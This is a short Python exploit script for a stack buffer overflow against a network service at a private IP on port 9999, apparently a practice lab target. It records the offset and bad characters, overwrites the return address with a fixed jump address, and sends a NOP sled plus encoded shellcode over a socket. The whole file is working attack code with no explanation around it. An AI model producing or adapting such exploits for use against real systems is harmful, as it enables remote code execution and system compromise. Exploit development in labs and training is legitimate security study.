#!/usr/bin/python3

import sys, socket, struct

host = '10.10.224.247'
port = 9999

# [*] Exact match at offset 524
# Badchars = 00 0a 0d
# Removed: 00 0a 0d

buf =  b""
buf += b"\xdb\xca\xb8\xfb\xe5\x13\xed\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x12\x31\x43\x17\x03\x43\x17\x83\x38\xe1\xf1"
buf += b"\x18\x8f\x31\x02\x01\xbc\x86\xbe\xac\x40\x80\xa0\x81"
buf += b"\x22\x5f\xa2\x71\xf3\xef\x9c\xb8\x83\x59\x9a\xbb\xeb"
buf += b"\x53\x57\x2f\xb2\x0b\x65\x4f\x45\x77\xe0\xae\xf5\xe1"
buf += b"\xa3\x61\xa6\x5e\x40\x0b\xa9\x6c\xc7\x59\x41\x01\xe7"
buf += b"\x2e\xf9\xb5\xd8\xff\x9b\x2c\xae\xe3\x09\xfc\x39\x02"
buf += b"\x1d\x09\xf7\x45"

shellcode = buf

eip = struct.pack('<I', 0x311712F3)

nop = b"\x90" * 20

payload = b'A' * 524 + eip + nop + shellcode


try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	s.send(payload + b'\n')
	s.close()

except:
	raise Exception("Unable to connect to server..")
	sys.exit()
